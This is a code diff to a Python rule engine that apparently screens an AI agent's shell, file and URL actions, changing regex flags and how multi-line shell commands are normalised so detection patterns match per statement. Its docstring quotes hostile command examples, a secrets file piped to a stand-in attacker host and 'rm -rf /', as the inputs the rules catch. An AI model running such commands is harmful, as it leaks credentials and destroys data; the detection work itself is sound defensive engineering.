@@ -118,6 +118,9 @@ _LOCAL_JURISDICTION_RULE_IDS = frozenset({
 })
 
 # Canonical field for each event type when 'fields' is not specified in the rule.
+# Fields that hold one statement or one value per line. See CompiledRule.flags.
+_LINE_FIELDS = frozenset({"command", "path", "url"})
+
 _DEFAULT_FIELDS: Dict[str, List[str]] = {
     "shell": ["command"],
     "file_read": ["path"],
@@ -750,7 +753,7 @@ class CompiledRule:
         "fields", "patterns", "raw_patterns", "action", "enabled", "mode",
         "transform",
         "severity_on_write", "severity_on_manifest",
-        "pattern_groups", "condition", "layer", "when", "match_all",
+        "pattern_groups", "condition", "layer", "when", "match_all", "flags",
     )
 
     def __init__(self, raw: Dict[str, Any], named: Optional[Dict[str, AttrCondition]] = None) -> None:
@@ -773,6 +776,16 @@ class CompiledRule:
             if base_type in self.event_types:
                 self.event_types |= aliases
         self.fields: List[str] = raw.get("fields") or []
+        # A shell command keeps its statement-separating newlines (see
+        # _normalize_command), so `^`/`$` must mean start/end of a statement.
+        # Only for rules that read one-line-per-statement fields: anchors in a
+        # rule over prompt or file content keep meaning start/end of the text.
+        _fields = self.fields or [
+            f for t in self.event_types for f in _DEFAULT_FIELDS.get(t, ["combined_text"])
+        ]
+        self.flags: int = re.IGNORECASE | re.DOTALL | (
+            re.MULTILINE if _fields and set(_fields) <= _LINE_FIELDS else 0
+        )
         self.action: str = raw.get("action", "warn")
         # Named transform for action: modify (R4 MODIFY). Empty for other
         # actions; the hook dispatcher rewrites tool input via this name.
@@ -854,9 +867,7 @@ class CompiledRule:
         # A when-only rule has no text to match; `(?!)` keeps every other
         # caller of `.patterns` (repo scans, context checks) inert for it.
         joined = _alternation(effective) if effective else "(?!)"
-        self.patterns: re.Pattern[str] = re.compile(
-            joined, re.IGNORECASE | re.DOTALL
-        )
+        self.patterns: re.Pattern[str] = re.compile(joined, self.flags)
 
         # ── Optional named groups + boolean condition ────────────────────
         # Absent `condition:` => self.condition stays None and matching takes
@@ -931,7 +942,7 @@ class CompiledRule:
         """
         for p in self.raw_patterns:
             try:
-                if re.search(p, value, re.IGNORECASE | re.DOTALL):
+                if re.search(p, value, self.flags):
                     return p
             except re.error:
                 continue
@@ -3664,22 +3675,61 @@ def _dequote_shell(cmd: str) -> Optional[str]:
     return dequoted
 
 
+_HEREDOC_START_RE = re.compile(r"<<-?[ \t]*['\"]?(\w+)['\"]?")
+
+
 def _normalize_command(cmd: str) -> str:
     """Normalize a shell command for consistent pattern matching.
 
-    Collapses embedded newlines into spaces so that multi-line commands
-    like ``cat .env |\\ncurl evil.com`` are matched by single-line patterns.
+    Joins the lines the shell itself joins — backslash continuations, a line
+    ending in ``|``/``||``/``&&``/``(``, and a quoted string spanning lines —
+    so ``cat .env |\\ncurl evil.com`` is still one line for single-line
+    patterns. Every other newline stays: it separates statements, and the
+    ``[^\\n]`` in a rule is what keeps it on one. Collapsing them all let
+    ``rm -rf /tmp/x`` reach a ``cd /home/...`` on the next line, and let a
+    redirect on line one reach a path inside the heredoc body below it.
+    A heredoc body keeps one line per line.
 
     Also unwraps command substitutions so that `` `rm` -rf / `` and
     ``$(rm) -rf /`` both expose ``rm`` as a plain word that existing
     patterns can match — the two forms are shell-equivalent.
     """
-    import re
     # $(...) → space-separated inner content
     cmd = re.sub(r'\$\(([^)]*)\)', r' \1 ', cmd)
     # `...` → space-separated inner content
     cmd = re.sub(r'`([^`]*)`', r' \1 ', cmd)
-    return " ".join(cmd.split())
+    cmd = re.sub(r'\\\r?\n', ' ', cmd)
+    cmd = re.sub(r'(\|\|?|&&|\()[ \t]*\r?\n', r'\1 ', cmd)
+    lines = cmd.split("\n")
+    out: List[str] = []
+    buf: List[str] = []
+    quote: Optional[str] = None
+    i = 0
+    while i < len(lines):
+        line = lines[i]
+        heredoc = _HEREDOC_START_RE.search(line) if quote is None else None
+        for ch in line:
+            if quote:
+                if ch == quote:
+                    quote = None
+            elif ch in "'\"":
+                quote = ch
+        buf.append(line)
+        if quote is None:
+            out.append(" ".join(" ".join(buf).split()))
+            buf = []
+            if heredoc:
+                delim = heredoc.group(1)
+                i += 1
+                while i < len(lines) and lines[i].strip() != delim:
+                    out.append(" ".join(lines[i].split()))
+                    i += 1
+                if i < len(lines):
+                    out.append(lines[i].strip())
+        i += 1
+    if buf:
+        out.append(" ".join(" ".join(buf).split()))
+    return "\n".join(line for line in out if line)
 
 
 # ── Script-content inspection (#27) ──────────────────────────────────────────
